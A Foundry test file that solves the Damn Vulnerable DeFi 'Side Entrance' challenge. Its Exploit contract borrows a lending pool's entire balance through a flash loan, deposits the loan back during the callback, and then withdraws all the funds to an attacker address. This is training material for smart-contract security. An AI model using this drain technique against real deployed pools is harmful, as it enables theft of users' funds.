// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "src/SideEntrance/SideEntranceLenderPool.sol";

// Challenge #4 - Side Entrance
// https://www.damnvulnerabledefi.xyz/challenges/side-entrance/

contract Attack is Test {
    SideEntranceLenderPool public pool;

    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    uint256 public constant ETHER_IN_POOL = 1000 * 1e18;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1 * 1e18;

    function setUp() public {
        pool = new SideEntranceLenderPool();

        vm.deal(address(pool), ETHER_IN_POOL);
        vm.deal(hacker, PLAYER_INITIAL_ETH_BALANCE);
    }

    function testInit() public {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(hacker.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    function testExploit() public {
        // Attack Code:
        Exploit exploit = new Exploit(payable(address(pool)));
        exploit.takeloan();

        vm.startPrank(hacker);
        exploit.withdraw();
        vm.stopPrank();

        assertEq(address(pool).balance, 0);
        assertEq(hacker.balance, ETHER_IN_POOL + PLAYER_INITIAL_ETH_BALANCE);
    }
}

contract Exploit {
    uint256 public amount;
    address payable public pool;

    constructor(address payable _pool) {
        pool = _pool;
        amount = pool.balance;
    }

    function takeloan() public {
        (bool success,) = pool.call(abi.encodeWithSignature("flashLoan(uint256)", amount));
        require(success, "Loan failed");
    }

    // flashloan的回调
    function execute() public payable {
        // 调用deposit
        (bool success,) = pool.call{value: amount}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");
    }

    function withdraw() public {
        (bool success,) = pool.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Withdraw failed");
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {}
}
